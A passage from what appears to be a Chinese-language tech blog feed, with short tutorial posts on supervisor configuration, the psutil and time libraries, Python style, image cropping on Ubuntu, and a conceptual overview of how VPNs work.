USR2。</li><li>stopwaitsecs：在操作系统给supervisord发送SIGCHILD信号时等待的时间</li><li>stopasgroup：如果设置为true，则会使supervisor发送停止信号到整个进程组</li><li>killasgroup：如果设置为true，则在给程序发送SIGKILL信号的时候，会发送到整个进程组，它的子进程也会受到影响。</li><li>user：如果supervisord以root运行，则会使用这个设置用户启动子程序</li><li>redirect_stderr：如果设置为true，进程则会把标准错误输出到supervisord后台的标准输出文件描述符。</li><li>stdout_logfile：把进程的标准输出写入文件中，如果stdout_logfile没有设置或者设置为AUTO，则supervisor会自动选择一个文件位置。</li><li>stdout_logfile_maxbytes：标准输出log文件达到多少后自动进行轮转，单位是KB、MB、GB。如果设置为0则表示不限制日志文件大小</li><li>stdout_logfile_backups：标准输出日志轮转备份的数量，默认是10，如果设置为0，则不备份</li><li>stdout_capture_maxbytes：当进程处于stderr capture mode模式的时候，写入FIFO队列的最大bytes值，单位可以是KB、MB、GB</li><li>stdout_events_enabled：如果设置为true，当进程在写它的stderr到文件描述符的时候，PROCESS_LOG_STDERR事件会被触发</li><li>stderr_logfile：把进程的错误日志输出一个文件中，除非redirect_stderr参数被设置为true</li><li>stderr_logfile_maxbytes：错误log文件达到多少后自动进行轮转，单位是KB、MB、GB。如果设置为0则表示不限制日志文件大小</li><li>stderr_logfile_backups：错误日志轮转备份的数量，默认是10，如果设置为0，则不备份</li><li>stderr_capture_maxbytes：当进程处于stderr capture mode模式的时候，写入FIFO队列的最大bytes值，单位可以是KB、MB、GB</li><li>stderr_events_enabled：如果设置为true，当进程在写它的stderr到文件描述符的时候，PROCESS_LOG_STDERR事件会被触发</li><li>environment：一个k&#x2F;v对的list列表</li><li>directory：supervisord在生成子进程的时候会切换到该目录</li><li>umask：设置进程的umask</li><li>serverurl：是否允许子进程和内部的HTTP服务通讯，如果设置为AUTO，supervisor会自动的构造一个url</li></ul><h2 id="配置文件实例"><a href="#配置文件实例" class="headerlink" title="配置文件实例"></a>配置文件实例</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[program:sougou]</span>   <span class="hljs-comment">#souogu 为程序的名称</span><br><span class="hljs-attr">command</span>=scrapy crawl sougou <span class="hljs-comment">#需要执行的命令</span><br><span class="hljs-attr">directory</span>=/home/mzj/桌面/sougou/sougou/wechat_name/wechat_name/spiders  <span class="hljs-comment">#命令执行的目录</span><br><span class="hljs-attr">environment</span>=ASPNETCORE__ENVIRONMENT=Production <span class="hljs-comment">#环境变量</span><br><span class="hljs-attr">user</span>=root <span class="hljs-comment">#用户</span><br><span class="hljs-attr">stopsignal</span>=INT<br><span class="hljs-attr">autostart</span>=<span class="hljs-literal">true</span> <span class="hljs-comment">#是否自启动</span><br><span class="hljs-attr">autorestart</span>=<span class="hljs-literal">true</span> <span class="hljs-comment">#是否自动重启</span><br><span class="hljs-attr">startsecs</span>=<span class="hljs-number">3</span> <span class="hljs-comment">#自动重启时间间隔（s）</span><br><span class="hljs-attr">stderr_logfile</span>=/home/mzj/桌面/sougou/sougou/wechat_name/wechat_name/spiders/oss<span class="hljs-literal">off</span>ical.err.log <span class="hljs-comment">#错误日志文件</span><br><span class="hljs-attr">stdout_logfile</span>=/home/mzj/桌面/sougou/sougou/wechat_name/wechat_name/spiders/oss<span class="hljs-literal">off</span>ical.out.log <span class="hljs-comment">#输出日志文件</span><br></code></pre></td></tr></table></figure><h1 id="使用-web-界面管理"><a href="#使用-web-界面管理" class="headerlink" title="使用 web 界面管理"></a>使用 web 界面管理</h1><p>修改 <code>/etc/supervisord.conf</code> :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">;[inet_http_server]         ; <span class="hljs-type">inet</span> (tcp) <span class="hljs-keyword">server</span> disabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span><br>;port=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9001</span>        ; ip_address:port specifier, *:port <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> iface<br>;username=<span class="hljs-keyword">user</span>              ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> username (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br>;<span class="hljs-keyword">password</span>=<span class="hljs-number">123</span>               ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">password</span> (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br></code></pre></td></tr></table></figure><p>去掉注释符号:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[inet_http_server]         ; <span class="hljs-type">inet</span> (tcp) <span class="hljs-keyword">server</span> disabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span><br>port=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9001</span>        ; ip_address:port specifier, *:port <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> iface<br>username=<span class="hljs-keyword">user</span>              ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> username (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br><span class="hljs-keyword">password</span>=<span class="hljs-number">123</span>               ; <span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">password</span> (<span class="hljs-keyword">open</span> <span class="hljs-keyword">server</span>)<br></code></pre></td></tr></table></figure><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><ul><li>supervisord : 启动supervisor</li><li>supervisorctl reload :修改完配置文件后重新启动supervisor</li><li>supervisorctl status :查看supervisor监管的进程状态</li><li>supervisorctl start 进程名 ：启动XXX进程</li><li>supervisorctl stop 进程名 ：停止XXX进程</li><li>supervisorctl stop all：停止全部进程，注：start、restart、stop都不会载入最新的配置文件。</li><li>supervisorctl update：根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 psutil 库</title>
    <link href="/2022/08/28/Python-%E4%B8%AD-psutil-%E5%BA%93/"/>
    <url>/2022/08/28/Python-%E4%B8%AD-psutil-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>psutil 是 process and system utilities.</p><p>其实现了 UNIX 命令行的许多功能。可跨平台使用，用于系统监控，性能分析，进程管理。</p><p><a href="https://psutil.readthedocs.io/en/latest">官方文档</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="获取-CPU-信息"><a href="#获取-CPU-信息" class="headerlink" title="获取 CPU 信息"></a>获取 CPU 信息</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> psutil<br><br></code></pre></td></tr></table></figure><h3 id="获取完整信息"><a href="#获取完整信息" class="headerlink" title="获取完整信息"></a>获取完整信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.cpu_times()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取-CPU-逻辑个数"><a href="#获取-CPU-逻辑个数" class="headerlink" title="获取 CPU 逻辑个数"></a>获取 CPU 逻辑个数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.cpu_count()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取-CPU-物理个数"><a href="#获取-CPU-物理个数" class="headerlink" title="获取 CPU 物理个数"></a>获取 CPU 物理个数</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-built_in">print</span>(psutil.cpu_count(<span class="hljs-attribute">logical</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><h3 id="获取-CPU-使用率"><a href="#获取-CPU-使用率" class="headerlink" title="获取 CPU 使用率"></a>获取 CPU 使用率</h3><p>其有两个参数，前者为 interval, 指定计算 CPU 使用率的时间间隔, 后者 percpu 指定需要总的使用率还是每个 CPU 的使用率:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">print</span>(psutil.cpu_percent(<span class="hljs-attribute">interval</span>=1))<br>    <span class="hljs-built_in">print</span>(psutil.cpu_percent(<span class="hljs-attribute">interval</span>=1, <span class="hljs-attribute">percpu</span>=Ture))<br></code></pre></td></tr></table></figure><h2 id="获取内存信息"><a href="#获取内存信息" class="headerlink" title="获取内存信息"></a>获取内存信息</h2><h3 id="获取内存的使用情况"><a href="#获取内存的使用情况" class="headerlink" title="获取内存的使用情况"></a>获取内存的使用情况</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.virtual_memory()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取系统交换内存的统计信息"><a href="#获取系统交换内存的统计信息" class="headerlink" title="获取系统交换内存的统计信息"></a>获取系统交换内存的统计信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.swap_memory()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="获取磁盘信息"><a href="#获取磁盘信息" class="headerlink" title="获取磁盘信息"></a>获取磁盘信息</h2><h3 id="获取磁盘分区的信息"><a href="#获取磁盘分区的信息" class="headerlink" title="获取磁盘分区的信息"></a>获取磁盘分区的信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_partitions)</span></span><br></code></pre></td></tr></table></figure><h3 id="获取磁盘的使用情况"><a href="#获取磁盘的使用情况" class="headerlink" title="获取磁盘的使用情况"></a>获取磁盘的使用情况</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_usage(<span class="hljs-string">&#x27;/&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取磁盘的-IO-统计信息-读写速度等"><a href="#获取磁盘的-IO-统计信息-读写速度等" class="headerlink" title="获取磁盘的 IO 统计信息(读写速度等)"></a>获取磁盘的 IO 统计信息(读写速度等)</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.disk_io_counters()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="获取网络信息"><a href="#获取网络信息" class="headerlink" title="获取网络信息"></a>获取网络信息</h2><h3 id="获取总的网络-IO-信息"><a href="#获取总的网络-IO-信息" class="headerlink" title="获取总的网络 IO 信息"></a>获取总的网络 IO 信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_io_counters()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取网卡的-IO-信息"><a href="#获取网卡的-IO-信息" class="headerlink" title="获取网卡的 IO 信息"></a>获取网卡的 IO 信息</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import psutil<br><br><span class="hljs-built_in">print</span>(psutil.net_io_counters(<span class="hljs-attribute">pernic</span>=Ture))<br></code></pre></td></tr></table></figure><h3 id="获取网络接口信息"><a href="#获取网络接口信息" class="headerlink" title="获取网络接口信息"></a>获取网络接口信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_if_addrs()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取网络接口状态信息"><a href="#获取网络接口状态信息" class="headerlink" title="获取网络接口状态信息"></a>获取网络接口状态信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.net_if_stats()</span></span>)<br></code></pre></td></tr></table></figure><h2 id="获取其他系统信息"><a href="#获取其他系统信息" class="headerlink" title="获取其他系统信息"></a>获取其他系统信息</h2><h3 id="获取系统开机的时间"><a href="#获取系统开机的时间" class="headerlink" title="获取系统开机的时间,"></a>获取系统开机的时间,</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.boot_time()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取连接系统的用户列表"><a href="#获取连接系统的用户列表" class="headerlink" title="获取连接系统的用户列表"></a>获取连接系统的用户列表</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.users()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取系统全部的进程信息"><a href="#获取系统全部的进程信息" class="headerlink" title="获取系统全部的进程信息"></a>获取系统全部的进程信息</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.pids()</span></span>)<br></code></pre></td></tr></table></figure><h3 id="获取单个进程的信息，获取指定进程-ID-x3D-100"><a href="#获取单个进程的信息，获取指定进程-ID-x3D-100" class="headerlink" title="获取单个进程的信息，获取指定进程 ID&#x3D;100"></a>获取单个进程的信息，获取指定进程 ID&#x3D;100</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">  import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.Process(<span class="hljs-number">100</span>)</span></span>)<br></code></pre></td></tr></table></figure><h2 id="模拟-ps-命令效果"><a href="#模拟-ps-命令效果" class="headerlink" title="模拟 ps 命令效果"></a>模拟 ps 命令效果</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import psutil<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(psutil.test()</span></span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用 Chrome 浏览器将 markdown preview 输出为 PDF 文件</title>
    <link href="/2022/08/28/%E4%BD%BF%E7%94%A8-Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%86-markdown-preview-%E8%BE%93%E5%87%BA%E4%B8%BA-PDF-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/08/28/%E4%BD%BF%E7%94%A8-Chrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%86-markdown-preview-%E8%BE%93%E5%87%BA%E4%B8%BA-PDF-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>进入 Chrome 浏览器，点击右键找到 <code>print</code> .</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 语言规范</title>
    <link href="/2022/08/28/Python-%E8%AF%AD%E8%A8%80%E8%A7%84%E8%8C%83/"/>
    <url>/2022/08/28/Python-%E8%AF%AD%E8%A8%80%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-语言规范"><a href="#Python-语言规范" class="headerlink" title="Python 语言规范"></a>Python 语言规范</h1><h2 id="Lint"><a href="#Lint" class="headerlink" title="Lint"></a>Lint</h2><h3 id="使用-pylint-工具"><a href="#使用-pylint-工具" class="headerlink" title="使用 pylint 工具"></a>使用 pylint 工具</h3><p>pylint 是一个在 Python 源代码中查找 bug 的工具。</p><p>可以使用 <code>pylint --list-msgs</code> 来获取 pylint 警告列表。</p><p>使用 <code>pylink --help-msg=C6409</code> 获取关于特定消息的更多信息.</p><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>仅对包和模块进行导入，而不单独导入函数或者类。</p><p>使用 <code>from x import y as z</code> 当模块太长。</p><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>使用模块的全路径名来导入每个模块。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p><code>ValueError</code> 指示一个程序错误。</p><p><code>assert</code> 保证内部的正确性。</p><p><code>raise</code> 语句，指示意外情况。</p><p>减少 <code>try/except</code> 块中的代码量。</p><p>使用 <code>finally</code> 子句来执行那些无论 try 块中有没有异常都应该被执行的代码。</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>避免全局变量。</p><p>鼓励使用模块级的常量如 <code>MAX_HOLY_HANDGRENADE_COUT = 3</code>，命名全用大写且用 <code>_</code> 分隔。</p><h2 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h2><p>适用于单行函数。</p><p>又名三元运算符，是对于 if 语句的一种更简短的句法规则:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> if cond else <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建梯子的原理</title>
    <link href="/2022/08/28/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <url>/2022/08/28/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="www.120cctv.cn/1494.html">参考博客</a></p><h1 id="什么是-GFW"><a href="#什么是-GFW" class="headerlink" title="什么是 GFW"></a>什么是 GFW</h1><h2 id="GFW-是-Great-Firewall-的简称，即中国防火墙，会屏蔽一些域名。"><a href="#GFW-是-Great-Firewall-的简称，即中国防火墙，会屏蔽一些域名。" class="headerlink" title="GFW 是 Great Firewall 的简称，即中国防火墙，会屏蔽一些域名。"></a>GFW 是 Great Firewall 的简称，即中国防火墙，会屏蔽一些域名。</h2><p><a href="https://b23.tv/NCShBzN">参考</a></p><h1 id="VPN-概念，技术原理和误区"><a href="#VPN-概念，技术原理和误区" class="headerlink" title="VPN 概念，技术原理和误区"></a>VPN 概念，技术原理和误区</h1><p>HTTP 协议比较大的缺点就是明文，其并没有对数据进行加密.</p><p>VPN 是 Virtual Private Network, 虚拟专用网络.</p><p>公司所要发送的数据都要经过 VPN 集线器加密.</p><p>VPN 有很多类型:</p><h2 id="VPN-类型"><a href="#VPN-类型" class="headerlink" title="VPN 类型"></a>VPN 类型</h2><h3 id="站点-–-站点"><a href="#站点-–-站点" class="headerlink" title="站点 – 站点"></a>站点 – 站点</h3><p>多用在同一个公司，但不同地点的内部网. 也可以用在不同公司的外部网.</p><p>站点对站点意味着两端或者多端的地点相对固定。</p><p>这时，数据包上的源地址会被更改为当前 VPN 集线器的地址，目标地址会被更改为目的 VPN 集线器的地址. 这样就隐藏了实际原地址和实际目标地址.</p><h3 id="客户端-–-站点"><a href="#客户端-–-站点" class="headerlink" title="客户端 – 站点"></a>客户端 – 站点</h3><p>客户端 – 站点 VPN，也可以称为远程登录 VPN, 其适合居家办公的情景.</p><p>一般来说，这种类型的 VPN 可以用浏览器直接通信. 也可以另外安装客户端软件来进行 VPN 通信.</p><p>这种类型也分为:</p><ul><li>全隧道, 即所有的网络数据都走公司网</li><li>半隧道</li></ul><h2 id="VPN-职责"><a href="#VPN-职责" class="headerlink" title="VPN 职责"></a>VPN 职责</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>常用算法为 AES 和 3DES, 这里的 E 代表 Encryption.</p><h3 id="保护数据完整性"><a href="#保护数据完整性" class="headerlink" title="保护数据完整性"></a>保护数据完整性</h3><p>使用 Hash, 使用算法根据字符串生成唯一的 Hash 值.</p><p>常用算法为 MD5 和 SHA.</p><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><p>常见使用的算法有 PSK 和 RSA.</p><h2 id="VPN-的框架"><a href="#VPN-的框架" class="headerlink" title="VPN 的框架"></a>VPN 的框架</h2><p>主要运用了两个协议:</p><ul><li>IPsec, IP Security, 位于网络层，其既可以用在 “客户端 – 站点” VPN, 也可以用在 “站点 – 站点” VPN</li><li>SSL&#x2F;TLS, 位于表示层,  这里位于后面的 S 都是 Security 的含义</li></ul>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS 夏令营网站习题总结</title>
    <link href="/2022/08/28/CNSS-%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%BD%91%E7%AB%99%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2022/08/28/CNSS-%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%BD%91%E7%AB%99%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="运行-Neofetch"><a href="#运行-Neofetch" class="headerlink" title="运行 Neofetch"></a>运行 Neofetch</h1><p>Neofetch 用于漂亮的显示系统 logo 和一些系统信息.</p><p>安装 Neofetch:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt -yqq <span class="hljs-keyword">install</span> neofetch<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 下处理图片</title>
    <link href="/2022/08/28/Ubuntu-%E4%B8%8B%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/28/Ubuntu-%E4%B8%8B%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>需要用到 <code>file</code> 命令和 <code>convert</code> 命令，若没有 <code>convert</code> 命令:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> graphicsmagick-imagemagick-compat<br></code></pre></td></tr></table></figure><h1 id="使用-file-命令"><a href="#使用-file-命令" class="headerlink" title="使用 file 命令"></a>使用 <code>file</code> 命令</h1><p>其作用为查看图片参数:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> <span class="hljs-keyword">file</span> helloc.png<br></code></pre></td></tr></table></figure><p>结果为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">helloc</span>.png: PNG image data, <span class="hljs-number">976</span> x <span class="hljs-number">1064</span>, <span class="hljs-number">8</span>-bit/color RGBA, non-interlaced<br></code></pre></td></tr></table></figure><h1 id="使用-convert-命令"><a href="#使用-convert-命令" class="headerlink" title="使用 convert 命令"></a>使用 <code>convert</code> 命令</h1><p>使用 <code>-crop</code> 参数的格式为:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>convert <span class="hljs-variable">$&#123;</span>SOURCE_IMG&#125; -crop <span class="hljs-variable">$&#123;</span>HIGHT&#125;x<span class="hljs-variable">$&#123;</span>WIDTH&#125;+<span class="hljs-variable">$&#123;</span>LEFT_TOP_X&#125;+<span class="hljs-variable">$&#123;</span>LEFT_TOP_Y&#125; <span class="hljs-variable">$&#123;</span>TARGET_IMG&#125;<br></code></pre></td></tr></table></figure><p>前面的 <code>$&#123;HIGHT&#125;x$&#123;WIDTH&#125;</code> 为目标的大小，<code>$&#123;LEFT_TOP_X&#125;</code> 为开始裁剪的宽度，<code>$&#123;LEFT_TOP_Y&#125;</code> 为开始裁剪的高度。也就是从左上角开始数的位置.</p>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 time 库</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-time-%E5%BA%93/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-time-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>time 库是 Python 中处理时间的标准库。</p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul><li>获取系统时间，并格式化输出</li><li>计时，方便分析程序的性能</li></ul><h1 id="time-函数"><a href="#time-函数" class="headerlink" title="time() 函数"></a>time() 函数</h1><p>用于获取从1970年1月1日00：00：00开始，到现在的总秒数，也被称为计算机内部时间.</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos">import <span class="hljs-built_in">time</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>())<br></code></pre></td></tr></table></figure><h1 id="localtime-函数和-gmtime-函数"><a href="#localtime-函数和-gmtime-函数" class="headerlink" title="localtime() 函数和 gmtime() 函数"></a>localtime() 函数和 gmtime() 函数</h1><p>都可返回以元组表示的时间对象.</p><p>localtime() 返回当地时间。</p><p>gmtime() 返回世界统一时间。</p><p>两者的默认参数为 <code>time.time()</code> 的返回值. 接受一个浮点数，表示秒。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import <span class="hljs-selector-tag">time</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.localtime()</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.gmtime()</span></span>)<br></code></pre></td></tr></table></figure><h1 id="ctime-函数"><a href="#ctime-函数" class="headerlink" title="ctime() 函数"></a>ctime() 函数</h1><p>其会读取当前时间并以易读的格式表示，返回字符串, 默认参数为 <code>time.time()</code> 的返回值:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import <span class="hljs-selector-tag">time</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.ctime()</span></span>)<br></code></pre></td></tr></table></figure><h1 id="strftime-函数"><a href="#strftime-函数" class="headerlink" title="strftime() 函数"></a>strftime() 函数</h1><p>以字符串形式格式化输出时间, 